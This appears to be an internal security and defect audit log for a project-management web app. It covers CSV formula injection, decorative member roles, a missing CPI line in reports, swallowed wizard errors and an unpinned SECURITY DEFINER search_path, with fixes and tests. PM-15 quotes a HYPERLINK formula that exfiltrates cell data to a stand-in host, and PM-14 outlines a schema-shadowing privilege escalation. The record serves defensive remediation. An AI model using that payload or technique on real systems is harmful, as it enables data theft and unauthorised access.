> **Verifier correction.** One overstatement: CR is in fact covered by the quoting regex (it is `[",\n\r]`), so 'CR is passed through untouched' is wrong — though irrelevant, since quoting does not neutralise a leading `=` either. `=`, `+`, `-`, `@` and TAB are genuinely untouched. MEDIUM is the right grade: the file is generated client-side from the exporter's own org data and downloaded locally, so exploitation needs a malicious project/document/checkout string authored inside the org and an exporter who opens the file and clicks through Excel's link-enable prompt.

**Done when.**

- [ ] csvField prefixes a value whose first character is one of = + - @ TAB CR with a single quote (or wraps it as `"'" + s`), before the existing quote/comma escaping
- [ ] the same guard is applied to every other CSV/TSV producer in the repo (audit lib/dataExport.ts, lib/exportTables.ts, lib/xlsxData.ts for the same gap)
- [ ] a test asserts that a project named `=1+1` round-trips into the CSV as an inert text cell
- [ ] the guard lives in one shared helper so future exporters inherit it

**Resolution (2026-09-30, projects Round G).** Reproduced: `csvField` quoted only for `" , CR LF`; a leading `=` `+` `-` `@` or TAB went through, and quoting does not neutralise it. New `lib/csvSafe.ts` — `csvCell` / `csvLine` / `isFormulaLike` / `CSV_FORMULA_LEADERS`: a value whose first character is `= + - @ TAB CR` is written as `"'<value>"` (the apostrophe convention, inside a quoted cell, quotes doubled); everything else keeps the existing escaping; BOM and extension unchanged (`DEC-44`). `lib/projectExport.ts` encodes every cell through it (its own `csvField` is gone) — including the org export's `#### name ####` section header, which is written as one `csvLine` cell with line breaks folded to a space.
- Commit: `f4c65a9`
- Tests: `projects.test.ts` "PM-10 — CSV cells are never live formulas" (`=1+1` → `"'=1+1"`, the HYPERLINK payload, all six leaders); `projectExport.test.ts` "a project named =1+1 and a purpose starting with =cmd are written as quoted, apostrophe-prefixed text" (no cell of the file begins with a formula character), "the exporter's only cell encoder is lib/csvSafe", "the org export's section header is a cell too: a name carrying a line break or a comma starts no live formula" (read back as RFC 4180 records).

**Done-when.**
- csvField prefixes = + - @ TAB CR with a quote-wrapped apostrophe — ✓.
- The same guard is applied to every other CSV/TSV producer — **split per DEC-31** into `PM-15` (six producers in other packages' files; the helper is exported for them). `lib/dataExport.ts` / `lib/exportTables.ts` write JSON and `lib/xlsxData.ts` only reads workbooks — none of the three writes CSV.
- A test asserts a project named `=1+1` round-trips as an inert text cell — ✓.
- The guard lives in one shared helper — ✓ (`lib/csvSafe.ts`).

**Scope / residual.** `PM-15`. *Fix pass (2026-09-30):* the first cut left the org export's `#### name ####` header line raw — a project name carrying a line break started a new CSV line that could open as a formula (`x⏎=HYPERLINK(…)`), and a comma split the header into a second cell. Now encoded as above.

---

<a id="pm-11"></a>

## PM-11 · Project member roles (collaborator / observer) are decorative — nothing anywhere reads them, so an 'observer' has exactly the powers of a 'collaborator'

- **Severity:** MEDIUM
- **Status:** RESOLVED
- **Verification:** CONFIRMED
- **Locations:** `types/schema.ts:944`, `app/(protected)/projects/[id]/page.tsx:924-927`, `app/(protected)/projects/[id]/page.tsx:131-134,952`, `lib/projects.ts:482-523,660-674`, `supabase/migrations/20260913_projects_rls_recursion_fix.sql:74-86`, `supabase/migrations/20260527_projects_and_collaboration.sql:61-62`
- **Independently verified:** ✓ **SURVIVES** — second independent adversarial pass. The claim of absence holds under a full-repo search — no RLS policy, API route, or lib function branches on collaborator vs observer. An observer can post into the regulated activity feed (project_activity_insert requires only org membership) exactly as a collaborator can.

**Mechanism.** `ProjectMemberRole = "owner" | "collaborator" | "observer"` is stored (CHECK-constrained), offered in the Add-member form, editable via updateMember, and carried through rowToMember — and then never consulted. Two differently-shaped searches confirm it: `grep -rn 'ProjectMemberRole' --include=*.ts --include=*.tsx .` returns only the type declaration, the schema field, the Add-member <Select>, and the lib signatures; `grep -rn 'role === "observer"|role === "collaborator"' …` returns exactly one hit, a badge colour ternary at page.tsx:952. Every authority decision is made without it: the page computes `canComment = isOwner || isMember || isAdmin` and `canManage = isOwner || isAdmin`, and RLS keys on projects.owner_user_id (is_project_owner) and org_members, never on project_members.role.

Two consequences follow. First, adding someone as an 'observer' grants them exactly the same access as a 'collaborator' — including the comment box on the Activity tab. Second, updateMember will happily set a member's role to 'owner' in project_members without touching projects.owner_user_id; the UI then computes `isOwner = m.role === "owner" || m.userId === project.ownerUserId` (page.tsx:943) and hides Remove and 'Make owner' for that person, so the roster displays and protects a second 'owner' who holds no authority at all.

**Failure scenario.** A project owner adds an outside-department reviewer as an 'observer', reasonably believing that means read-only. The observer posts comments into the project's regulated activity feed, and (because canManage is separate) is otherwise indistinguishable from a collaborator. Later, a controller sets a member's role to 'owner' to reflect a real handover but does not use 'Make owner'; the roster now shows two owners, the real owner cannot be removed (correct) and neither can the fake one (incorrect), and the fake owner's writes are all rejected by RLS with confusing errors.

**Evidence.**

```
types/schema.ts:944: `export type ProjectMemberRole = "owner" | "collaborator" | "observer";`. The only behavioural read in the codebase is page.tsx:952, a className ternary. RLS write predicate: 20260913:80-86 `USING (is_org_controller(project_org(project_members.project_id)) OR is_project_owner(project_members.project_id))` — project_members.role is not referenced. removeMember guards only `proj.ownerUserId === input.userId` (lib/projects.ts:542).
```

> **Verifier correction.** The second consequence is overstated and should be softened. updateMember is invoked from exactly one place in the app (page.tsx:898) and only with `responsibility` — never with `role` — and the Add-member Select offers only collaborator/observer, so a member row with role='owner' can only arise from transferOwnership (lib/projects.ts:634-641), which sets projects.owner_user_id first and demotes the prior owner, i.e. correctly. The 'roster protects a phantom owner' scenario therefore requires a direct PostgREST/API write by an owner or controller, not any UI path.

**Done when.**

- [ ] either the role is enforced — observer cannot post project_activity, collaborator cannot, owner-role members are reconciled with projects.owner_user_id — or the observer option is removed from the Add-member form and the column documented as descriptive only
- [ ] canComment / canManage derive from the member role where a role is meant to matter, rather than from bare membership
- [ ] updateMember refuses to set role='owner' (ownership moves only through transferOwnership, which updates projects.owner_user_id), or transferOwnership is the only writer of that value
- [ ] the UI's isOwner derivation stops trusting project_members.role as a proxy for authority

**Resolution (2026-09-30, projects Round G).** Database half record-only: roles-and-permissions `SURF-11` / 20261047 made `can_manage_project` admit only `owner` / `collaborator` roster rows (verified in the file). App half and the comment rail done here (`DEC-44` default: keep the observer option, enforce it): `supabase/migrations/20261102_prj_roundG_project_rails.sql`'s insert policy refuses an observer's `comment`; the page's `canComment` excludes observers and the picker says "Observer — can see, cannot manage or comment" (projects-tab `UX-14`); `updateMember` and `addMember` refuse `role: 'owner'` — ownership moves only through `transferOwnership` / `transfer_project_ownership`, which also moves `owner_user_id`; the page's `isOwner` (header and roster) reads `projects.owner_user_id` only, and a roster row that merely says `owner` is labelled "owner (roster only)" with no owner protection.
- Commits: `7ca202f`, `e0c1aa2`, `9363ebb`
- Tests: `projects.test.ts` "PM-11 — 'owner' is set only by a transfer"; `projectPageRoundG.test.ts` "authority is projects.owner_user_id; an observer gets no comment box…".
- Pending migration: `supabase/migrations/20261102_prj_roundG_project_rails.sql` (inventory: roster rows with role owner whose user is not the project's owner).

**Done-when.**
- The role is enforced — observer cannot post, owner-role rows reconciled with owner_user_id — ✓ (observer: UI + database after `supabase/migrations/20261102_prj_roundG_project_rails.sql`; owner rows: no writer sets them outside the transfer; the inventory counts the historical mismatches).
- canComment / canManage derive from the role where it matters — ✓ (`canComment`; `canManage` stays owner-or-controller, matching the write policies).
- updateMember refuses role='owner' — ✓ (and addMember).
- The UI's isOwner stops trusting project_members.role — ✓.

**Scope / residual.** Notification audiences still include observers (notifications `PROD-4`).

---

<a id="pm-12"></a>

## PM-12 · The printed project report can never show CPI, and its milestone percent index is keyed by array position instead of milestone id

- **Severity:** MEDIUM
- **Status:** RESOLVED
- **Verification:** CONFIRMED
- **Locations:** `lib/projectReport.ts:43-44`, `lib/projectReport.ts:54-59`, `lib/projectReport.ts:139-140`, `lib/projectReport.ts:192-195`, `lib/costs.ts:303-333`
- **Independently verified:** ✓ **SURVIVES** — second independent adversarial pass. Confirmed, and the contrast is on file: components/projects/CostsTab.tsx:98 calls `computeCostRollup(accounts, entries, pctIndex)` with a real id-keyed map, and lib/projectSnapshot.ts:55 does the same — so the Costs tab and snapshot can show a CPI the printed report structurally cannot. Note the milestone query at projectReport.ts:47 doesn't even select `id`, so the index could not be keyed correctly as written.

**Mechanism.** gatherReportData builds a percent index and then throws it away:

```ts
const pctIdx = milestonePctIndex(live.map((m, i) => ({
  id: String(i), percentComplete: (m.percent_complete as number | null) ?? null, status: String(m.status ?? "planned"),
})));
void pctIdx; // EV pinning uses milestone ids; report uses account-level rollup below
const rollup = computeCostRollup(accounts, entries, new Map());
```

Two independent defects:
(a) `new Map()` is passed as the milestonePct argument. In computeCostRollup, `earnedValue` is non-null only when `a.wbsMilestoneId` resolves in that map, and `cpi: evActual > 0 ? evTotal / evActual : null`. With an empty map, evTotal and evActual stay 0, so **rollup.cpi is null on every report, always**. The report guards on it (`d.rollup.cpi != null ? row("Cost performance (CPI)", …) : ""`), so the headline cost-performance line is simply absent; computeForecast receives `cpi: null`, weakening the forecast sentence; and draftLessonsLearned's `(CPI x.xx)` clause never fires.
(b) Even if the map were used, its keys are `String(i)` — '0','1','2' — because the milestones query at line 43 selects `name, planned_at, status, percent_complete, source` and does NOT select `id`. cost_accounts.wbs_milestone_id holds UUIDs, so no key could ever match.

Meanwhile the Costs tab and the health score compute CPI correctly from a real id-keyed index (lib/projectSnapshot.ts:50-55 passes `id: String(m.id)` from a query that does select id).

**Failure scenario.** A project manager pins every budget line to a schedule task specifically to unlock CPI — the coach told them it would ('Pin budget lines to schedule tasks … Unlocks Cost health (CPI)', projectHealth.ts:192-197). The Costs tab and the health dial show CPI 0.91. They click Report to take the boss brief into the monthly review. The Money section shows budget, committed, spent, remaining — and no CPI line at all, with no explanation. The two artefacts describing the same project disagree about whether cost performance is even measurable, and the lessons-learned draft that goes into the permanent record omits the cost-performance figure.

**Evidence.**

```
lib/projectReport.ts:55-59 quoted verbatim above. lib/projectReport.ts:43: `supabase.from("milestones").select("name, planned_at, status, percent_complete, source")` — no `id`. lib/costs.ts:307-309: `const pct = a.wbsMilestoneId ? milestonePct.get(a.wbsMilestoneId) : undefined; const earnedValue = pct !== undefined ? … : null; if (earnedValue !== null) { evTotal += earnedValue; evActual += spent; }` and :332 `cpi: evActual > 0 ? evTotal / evActual : null`.
```

> **Verifier correction.** Severity downgraded to MEDIUM. Because every consumer null-guards, the failure mode is omission — the CPI row and the '(CPI x.xx)' clause never render and the forecast sentence loses one input — not a wrong number printed on a boss brief. Defect (b) is latent (it would only bite if someone deleted the `void pctIdx` line without also adding `id` to the select).

**Done when.**

- [ ] the report's milestone query selects `id` and passes a real id-keyed milestonePctIndex into computeCostRollup, so rollup.cpi matches what the Costs tab and the health score show for the same project
- [ ] the `void pctIdx` line and its comment are removed rather than left describing behaviour that isn't happening
- [ ] a test asserts that for a project with a pinned cost account and a 50%-complete milestone, gatherReportData().rollup.cpi is non-null and equals the Costs tab value
- [ ] the forecast sentence and draftLessonsLearned are re-checked now that cpi is populated

**Resolution (2026-09-29, projects Round G).** Closed with projects-tab `MON-5` (same package, same pass). `lib/projectReport.ts`: the milestone query selects `id`; a real id-keyed `milestonePctIndex` feeds `computeCostRollup`; `void pctIdx` and its comment are gone; the forecast now takes the CPI basis when CPI exists and `draftLessonsLearned` emits the `(CPI x.xx)` clause. Also in this pass: the closeout section renders the gate snapshot from the newest `PROJECT_COMPLETED` audit row's `details` when present (`parseGateSnapshot` reads `gates` / `gateSnapshot` / `closeoutGates` tolerantly — array of `{ text, ok }` or keyed booleans / objects) and says plainly when no snapshot was recorded, rather than passing today's rows off as closeout day's (PT `SAF-14` report half; PC-2 writes the row). Tests: `lib/__tests__/projectReport.test.ts` — "a pinned account + a 50% milestone yields the same CPI the Costs tab computes" (`rollup.cpi` = 1.25 = the Costs tab computation), "the forecast is on the CPI basis and the lessons-learned draft carries the figure", "renders the gate state recorded on the completion audit row, as recorded", "a completion without a snapshot says so…", "parseGateSnapshot reads the recorded shapes tolerantly". Reproduced against `8276cad` before editing: the new tests failed there (13 of 45 across `projectReport.test.ts` / `projectControls.test.ts`; `projectSnapshot.test.ts` could not even load — `lib/milestoneLiveness.ts` did not exist and the filter at `projectSnapshot.ts:49` was the manual-only one quoted above).

**Done-when.**
- The report's milestone query selects `id` and passes a real id-keyed index, so `rollup.cpi` matches the Costs tab and the health score — ✓.
- The `void pctIdx` line and its comment are removed — ✓.
- A test asserts that for a pinned account + 50%-complete milestone `gatherReportData().rollup.cpi` is non-null and equals the Costs tab value — ✓.
- The forecast sentence and `draftLessonsLearned` are re-checked now that cpi is populated — ✓ (both tested).

**Scope / residual.** The gate-snapshot shape is read tolerantly because PC-2 (J8) had not merged when this landed; if J8 stores it under another key, `parseGateSnapshot` is the one place to add it. Closes `COST-1`'s report half by pointer. *Fix pass (2026-09-30):* the first done-when ("`rollup.cpi` matches the Costs tab and the health score") had one hole. The report still read `limit(500)` while the snapshot read 1,000 unordered, so for an imported schedule over 500 activities the three surfaces used different rows. All three now read the same first `PROJECT_MILESTONE_READ_LIMIT` (1,000) rows by planned date, and the report discloses "first N of M" beyond that. Detail and tests are in projects-tab `MON-5`.

---

<a id="pm-13"></a>

## PM-13 · The project wizard reports success while silently discarding budget lines, milestones and contractors the user typed

- **Severity:** MEDIUM
- **Status:** RESOLVED
- **Verification:** CONFIRMED
- **Locations:** `components/projects/ProjectWizard.tsx:154-196`, `components/projects/ProjectWizard.tsx:141-150`, `components/projects/ProjectWizard.tsx:198-206`
- **Independently verified:** ✓ **SURVIVES** — second independent adversarial pass. Confirmed exactly as claimed. Worth adding that the extended-fields update at :150-152 does the same for purpose/goals/success_criteria/setup_state (console.warn only) — so a wizard run can succeed visually while everything after the bare projects row is gone. cost_accounts writes are reachable for the creator (20261013:307-312 adds `cost_accounts_owner_write ... USING (user_owns_project(project_id))`), so this is a failure-path defect rather than a guaranteed one.

**Mechanism.** After createProject succeeds, four follow-up writes carry the user's actual input, and every one of them swallows failure:

```ts
if (accErr) console.warn("[wizard] budget lines not saved:", accErr.message);
…
await supabase.from("milestones").insert(ms.map(…)).then(() => undefined, () => undefined);
…
} else if (pErr) { console.warn("[wizard] contractors not saved:", pErr.message); }
…
await seedTurnoverItems({…}).catch(() => undefined);
```

The milestones insert discards even a thrown error via the two-argument .then. The extended-fields update (purpose, goals, success criteria, job_kind, sow_document_id, setup_state) is checked only against two 'column missing' codes and otherwise console.warn'd. Control then falls through to `onCreated(); router.push('/projects/' + projectId);` — the user lands on a project page with no error banner, no toast, and no indication that the six milestones and four budget lines they just typed are gone. This is the supabase-js `{error}`-not-throw pattern applied to the app's primary data-entry funnel.

**Failure scenario.** A superintendent spends ten minutes in the wizard entering a $305k budget across four accounts, five milestones and three contractors. cost_accounts insert is rejected (an RLS edge, a CHECK on cost_type, a numeric overflow — anything). The wizard routes them to the project page, which shows the coach saying 'Add a budget (2 min) — unlocks the burn bar, the S-curve, and the finish-cost forecast' and 'Add a schedule'. They assume the coach is being pushy about something they already did, or that the page has not refreshed, and re-enter it — or don't, and the project runs with no budget while the health score reports 'No budget set yet'.

**Evidence.**

```
ProjectWizard.tsx:157-163 (`if (accErr) console.warn(...)`), :167-172 (`.then(() => undefined, () => undefined)` on the milestones insert), :186-195 (console.warn on both party paths), :199-202 (`.catch(() => undefined)` on seedTurnoverItems), then :203-204 `onCreated(); router.push(\`/projects/${projectId}\`);` with no state carrying any of those failures.
```

> **Verifier correction.** Scope note: createProject itself and the projects insert do throw on failure, so the project is always created; the loss is confined to the four follow-up writes. The claim that the user sees no banner is inferred from there being no state that carries these failures, which is a sound code-level inference — but it is a claim about a UI nobody ran, so phrase it as 'nothing in the component surfaces them' rather than 'the user sees nothing'.

**Done when.**

- [ ] each follow-up write's failure is collected and shown to the user on the destination project page (a banner naming exactly what did not save), instead of console.warn
- [ ] the milestones insert stops using `.then(() => undefined, () => undefined)` and binds its error like the others
- [ ] the user's typed rows survive a partial failure — either the whole creation is transactional, or the unsaved rows are retained so they can retry without re-typing
- [ ] a test simulates a cost_accounts insert error and asserts the wizard surfaces it

**Resolution (2026-09-29, projects Round G).** Closed with projects-tab `UX-1` (same package, same pass) — that record carries the detail. Package default taken: partial failure keeps the project and retains the typed rows in component state for a retry; not a full transaction. New `lib/projectWizardWrites.ts` (`runWizardFollowUpWrites`) binds every follow-up write's error — the milestones insert loses `.then(() => undefined, () => undefined)`; the extended-fields update reports `PGRST204` / `42703` as "the database has not been migrated…" instead of treating it as success; the turnover seed's `{ ok: false }` counts — and returns the failures. `components/projects/ProjectWizard.tsx` stays open on a partial failure with a `role="alert"` panel naming exactly what did not save and why, **Retry unsaved** re-runs only the refused steps with the retained rows, **Open project anyway** is explicit. The `company_id` write is unchanged (pre-migration retry without it preserved). Test: `lib/__tests__/projectWizard.test.ts` — "a refused cost_accounts insert surfaces, named, with the rows untouched for a retry", "the milestones insert binds its error…", "the retry re-runs ONLY the refused steps…", "company_id missing (pre-migration) retries the parties without the link". Reproduced: `ProjectWizard.tsx:141-206` at `8276cad` as quoted.

**Done-when.**
- Each follow-up write's failure is collected and shown to the user (a banner naming exactly what did not save) instead of `console.warn` — ✓ (the banner is in the wizard before routing; `page.tsx` is J8's, and the wizard holds the rows).
- The milestones insert binds its error like the others — ✓.
- The user's typed rows survive a partial failure — ✓. They are retained in state, and **Retry unsaved** re-runs only the refused steps; that recovers a transient refusal. A persistent refusal (CHECK / overflow / RLS) fails the same way on retry. For that case the failure panel shows each failed step's typed rows read-only with a **Copy** button (`retainedRowLines`, 2026-09-30 fix pass), so **Open project anyway** or the X no longer discard rows the user never saw. Editing a refused row in place is not offered (see projects-tab `UX-1`).
- A test simulates a `cost_accounts` insert error and asserts the wizard surfaces it — ✓.

**Scope / residual.** See `UX-1`.

---

<a id="pm-14"></a>

## PM-14 · is_org_controller — the SECURITY DEFINER predicate behind every projects, cost and controls RLS policy — has no SET search_path

- **Severity:** LOW
- **Status:** RESOLVED
- **Verification:** CONFIRMED
- **Locations:** `supabase/migrations/20260814_documents_delete_controllers.sql:31-40`, `supabase/migrations/20260906_projects_hardening.sql:62,68,76,95,124,171`, `supabase/migrations/20261013_project_controls_program.sql:238,246,264,269,274,281,286`
- **Independently verified:** ✓ **SURVIVES, corrected** — second independent adversarial pass. Severity **MEDIUM → LOW** by this pass. The factual claim is exactly right, and the deviation from the house convention is stark — the sibling helpers pin it (20261013:58 `... SECURITY DEFINER SET search_path = public`, whose own comment says "search_path pinned per the house SECURITY DEFINER pattern"; likewise 20260913:22,28,33,41). Lowering to LOW: exploitation requires a principal who can already CREATE a schema that precedes public on the role's search_path, which on a managed Supabase instance is an admin-level capability, so this is a defense-in-depth/linter-grade hardening gap (Supabase flags it as a WARN) rather than a reachable privilege escalation for any application role.

**Mechanism.** The function is defined once in the whole repo (verified by `grep -rn 'FUNCTION is_org_controller' supabase/`, which returns exactly one hit, and by a second grep for any later CREATE OR REPLACE with search_path, which returns none):

```sql
CREATE OR REPLACE FUNCTION is_org_controller(p_org uuid)
RETURNS boolean LANGUAGE sql STABLE SECURITY DEFINER AS $$
  SELECT EXISTS (
    SELECT 1 FROM org_members
    WHERE uid = auth.uid() AND org_id = p_org AND status = 'active'
      AND (role IN ('Admin', 'DocCtrl') OR roles && ARRAY['Admin', 'DocCtrl']::text[])
  );
$$;
```

No `SET search_path`. The unqualified `org_members` and `auth.uid()` resolve through the caller's search_path at execution time. Every sibling function written later follows the house rule — is_project_member/project_org/is_project_owner/project_visible_to_me (20260913:22,28,33,41), user_owns_project (20261013:58), bump_intake_use (20260902:75), enforce_checkout_release_guard (20260831:81) all pin `SET search_path = public`. This one, the oldest and the most widely depended on, does not.

**Failure scenario.** Any role that can create objects in a schema that precedes public on the search_path (or any future migration, extension or tooling that alters the default search_path for a role) can shadow `org_members` with a view of its own. Because the function is SECURITY DEFINER, the shadowed lookup runs with the definer's privileges and returns true, and the caller becomes a controller for every projects, project_members, project_activity, markup_requests, project_intake_links, cost_accounts, cost_entries, cost_documents, project_parties, change_orders, project_checklists, checklist_items, turnover_items and punch_items policy at once — the entire projects and cost-control access model, plus the checkout force-release guard which calls it.

**Evidence.**

```
20260814_documents_delete_controllers.sql:32: `RETURNS boolean LANGUAGE sql STABLE SECURITY DEFINER AS $$` — compare 20260913_projects_rls_recursion_fix.sql:22: `RETURNS boolean LANGUAGE sql STABLE SECURITY DEFINER SET search_path = public AS $$`. Call sites counted above span 20260906 and 20261013.
```

> **Verifier correction.** Grade the code fact CONFIRMED and the exploit SUSPECTED: nothing in the repo shows an unprivileged role able to create objects in a schema that precedes public on the caller's search_path, so the consequence is not observable from the repo. Also note this predicate is the roles-and-permissions area's central primitive — worth citing that report rather than filing fresh.

**Done when.**

- [ ] is_org_controller is recreated with `SET search_path = public` (or `= pg_catalog, public`), matching every other SECURITY DEFINER helper in the schema
- [ ] a repo-wide check confirms no SECURITY DEFINER function lacks a pinned search_path — run `grep -rn 'SECURITY DEFINER' supabase/migrations/*.sql` and verify each hit
- [ ] CREATE privilege on schemas ahead of public is confirmed to be denied to non-superuser roles as defense in depth

**Resolution (2026-09-30, projects Round G).** Record-only close → roles-and-permissions `DB-6`: `supabase/migrations/20261020_pin_search_path.sql` pins `is_org_controller(uuid)` (`ALTER FUNCTION … SET search_path = public`, the `'is_org_controller(uuid)'` entry in its list). Re-verified at `2a2ae73`: `grep -rn 'FUNCTION is_org_controller' supabase/migrations` finds only the 20260814 definition, so no later migration re-created it without the pin; `lib/__tests__/searchPathPin.test.ts` replays the whole sequence and fails on any SECURITY DEFINER function whose final definition is unpinned and not covered by 20261020 — it passes on this branch, including the ten SECURITY DEFINER functions 20261102 / 20261103 define (all pinned at creation).

**Done-when.**
- is_org_controller is pinned — ✓ (20261020, DB-6).
- A repo-wide check confirms no SECURITY DEFINER function lacks a pinned search_path — ✓ (`searchPathPin.test.ts`, in the loop).
- CREATE on schemas ahead of public denied to non-superusers — ✓ by pointer to DB-6's record (a live-database property; nothing in this package changes it).

**Scope / residual.** None.

---


<a id="pm-15"></a>

## PM-15 · Six other CSV exports write formula-leading cells unescaped — PM-10's guard reached only the project export

- **Severity:** MEDIUM
- **Status:** OPEN
- **Verification:** CONFIRMED (the producers located by `grep -rln 'text/csv' app lib components`; each builds its cells without `lib/csvSafe`)
- **Locations:** `app/(protected)/admin/audit/page.tsx:450` (audit export), `app/(protected)/register/page.tsx:59-64` → `lib/docControlRegister.ts` `registerToCsv`, `app/(protected)/admin/permissions/page.tsx:209` → `lib/ownership.ts` `ownershipRegisterToCsv`, `app/(protected)/requests/page.tsx:587`, `app/api/knowledge/drawing/route.ts:147`, `components/cockpit/CommandDeck.tsx:342`
- **Related:** `PM-10` (split from its done-when 2 per `DEC-31`)
- **Independently verified:** — (`author`: opened by projects Round G while resolving `PM-10`; not yet challenged)

**Mechanism.** `PM-10` added `lib/csvSafe.ts` (`csvCell` / `csvLine`: a value led
by `= + - @ TAB CR` is written as an apostrophe-prefixed quoted cell) and moved
the project export onto it. Six other producers build CSV cells with their own
quoting, and none neutralises a formula-leading value. Their cells are
user-typed too — document titles and numbers (register), audit details and
user emails (audit export), ticket titles and requester names (requests),
drawing text (knowledge), owner names (ownership register).

**Failure scenario.** The same as `PM-10`: a document titled
`=HYPERLINK("https://evil.example/?d="&A2,"Open")` becomes a live formula in
the document-control register export an auditor opens in Excel.

**Remediation.** Route each producer's cell encoding through `csvCell` (the
files belong to document-control P10, admin-and-org and drafting-flow
packages — each adopts it in its own file). `lib/dataExport.ts` /
`lib/exportTables.ts` write JSON and `lib/xlsxData.ts` only reads workbooks;
they need nothing.

**Done when.**
- Every CSV producer in the repo encodes its cells through `lib/csvSafe`.
- A census test fails for a new `text/csv` producer that does not import it.

---
